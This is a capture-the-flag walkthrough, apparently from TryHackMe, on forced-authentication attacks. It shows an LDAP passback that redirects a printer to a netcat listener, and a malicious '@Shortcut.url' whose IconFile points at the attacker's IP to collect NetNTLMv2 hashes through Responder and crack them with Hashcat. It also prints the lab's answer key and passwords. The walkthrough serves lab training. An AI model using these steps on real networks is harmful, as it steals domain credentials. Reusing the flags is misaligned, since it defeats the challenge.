# Task 06: Coercion Attacks

---

## Stage A: Original Task Content & Briefing Summary

Task 06 details the mechanics of **Forced Authentication / Coercion Attacks** (MITRE ATT&CK Technique T1187). In coercion attacks, the attacker manipulates an enterprise system or user into transmitting authentication material to an attacker-controlled listener.

### 1. Attack Vector 1: LDAP Passback Attack (Embedded Devices):
* Network printers, scanners, copiers, and appliances integrate with Active Directory via LDAP (port 389) to support address books and badge scanning.
* The printer's web configuration interface (`http://printer.thm.loc/`, login `admin:admin`) stores domain service account credentials.
* **The LDAP Passback Methodology:**
  1. Access the printer configuration page: `Settings -> LDAP Configuration`.
  2. The page masks the service account password as dots (`••••••••`).
  3. Change the **LDAP Server IP** to point to the attacker's AttackBox/VPN IP (`YOUR_TUN0_IP`) and port `3489`.
  4. Start a Netcat listener on the attacker's machine:
     ```bash
     nc -lvnp 3489
     ```
  5. Click **Test Connection** on the printer interface.
  6. The printer connects to the attacker's listener and submits its configured Simple Bind LDAP request in plaintext, disclosing the Bind DN and password.

### 2. Attack Vector 2: File-Based Coercion via Writable SMB Share:
* Target Share: `//SERVER1.thm.loc/shared-docs` (writable by authenticated domain users, such as `alice.moore`).
* When Windows Explorer opens a folder containing `.url`, `.lnk`, or `.scf` shortcut files, it automatically evaluates the `IconFile` path to render the file's icon in the GUI—**even if the user never opens or clicks the file**.
* **Crafting the Malicious `@Shortcut.url` File:**
  ```ini
  [InternetShortcut]
  URL=http://127.0.0.1
  IconFile=\\YOUR_TUN0_IP\icons\icon.ico
  IconIndex=1
  ```
  * *Naming Trick:* Adding the `@` symbol at the beginning (`@Shortcut.url`) forces the file to appear alphabetically at the very top of the folder view, guaranteeing instant rendering.
* **Capturing and Cracking the NetNTLMv2 Hash:**
  1. Start Responder to capture inbound authentication:
     ```bash
     sudo responder -I tun0 -v
     ```
  2. Upload the shortcut file to the share using `smbclient`:
     ```bash
     smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!' -c 'put @Shortcut.url'
     ```
  3. When domain employee `sarah.jones` browses the share, her workstation attempts to retrieve the icon from the attacker's UNC path, automatically transmitting her NetNTLMv2 hash to Responder.
  4. Crack the captured NetNTLMv2 hash using Hashcat mode 5600:
     ```bash
     hashcat -m 5600 sarah_hash.txt /usr/share/wordlists/rockyou.txt
     ```
  5. Recovered password: `Trustno1`.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Coercion as the Ultimate Relay Trigger:**
  * In modern Active Directory penetration testing, coercion attacks (e.g. PetitPotam, SpoolSample, DFSCoerce, ShadowCoerce) are combined with **NTLM Relaying**.
  * By coercing an administrative server or Domain Controller to authenticate to an attacker machine running `ntlmrelayx.py`, the authentication can be relayed into Active Directory Certificate Services (AD CS) to obtain a Golden Certificate, achieving domain dominance in seconds without cracking any passwords.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** For LDAP passback, point the printer's LDAP server setting to your Netcat listener and click Test Connection.
* **Tier 2 Hint:** For file coercion, write `@Shortcut.url` with an IconFile pointing to your Responder IP and upload it to `shared-docs`.
* **Tier 3 Hint:** The LDAP Bind DN is `CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc` and password is `Pr1ntBind2025!`. Sarah's cracked password is `Trustno1`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Execute LDAP Passback Attack:
1. Start Netcat on the AttackBox:
   ```bash
   nc -lvnp 3489
   ```
2. Navigate to `http://printer.thm.loc/` (Login: `admin:admin`).
3. Under **LDAP Settings**:
   * Set **Server Address** to your `tun0` IP.
   * Set **Port** to `3489`.
   * Click **Save and Test Connection**.
4. Capture plaintext LDAP Simple Bind stream in Netcat:
   ```text
   Connection received on 192.168.12.71 49821
   0...`...CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc..Pr1ntBind2025!
   ```
5. Extracted Bind DN: `CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc`
6. Extracted Password: `Pr1ntBind2025!`

---

### 2. Execute File-Based Coercion Attack:
1. Create `@Shortcut.url` locally:
   ```bash
   cat << 'EOF' > @Shortcut.url
   [InternetShortcut]
   URL=http://127.0.0.1
   IconFile=\\10.10.14.50\icons\icon.ico
   IconIndex=1
   EOF
   ```
2. Launch Responder on `tun0`:
   ```bash
   sudo responder -I tun0
   ```
3. Upload to `shared-docs` using Alice's credentials:
   ```bash
   smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!' -c 'put @Shortcut.url'
   ```
4. Responder captures NetNTLMv2 hash for `THM\sarah.jones`:
   ```text
   [SMB] NTLMv2-SSP Client   : 192.168.12.61
   [SMB] NTLMv2-SSP Username : THM\sarah.jones
   [SMB] NTLMv2-SSP Hash     : sarah.jones::THM:1122334455667788:A9C8...
   ```
5. Crack hash with Hashcat:
   ```bash
   hashcat -m 5600 sarah.hash /usr/share/wordlists/rockyou.txt
   ```
   * Result: `Trustno1`.

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the Bind DN of the service account captured during the LDAP passback attack?
  * **Answer:** `CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc`
* **Question 2:** What is the plaintext password captured from the LDAP passback?
  * **Answer:** `Pr1ntBind2025!`
* **Question 3:** What is the cracked password for sarah.jones obtained through file-based coercion?
  * **Answer:** `Trustno1`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed verified answers on TryHackMe: `CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc`, `Pr1ntBind2025!`, and `Trustno1`.
* Reconciled captured NetNTLMv2 hash structure against Hashcat mode 5600 cracking specifications.

---

## Stage G: Key Educational Takeaway

Coercion attacks exploit legitimate system functionalities (embedded device directory binds and automatic icon rendering) to force target servers and clients to transmit credentials to attacker listeners, bridging the gap between passive listening and active credential acquisition.
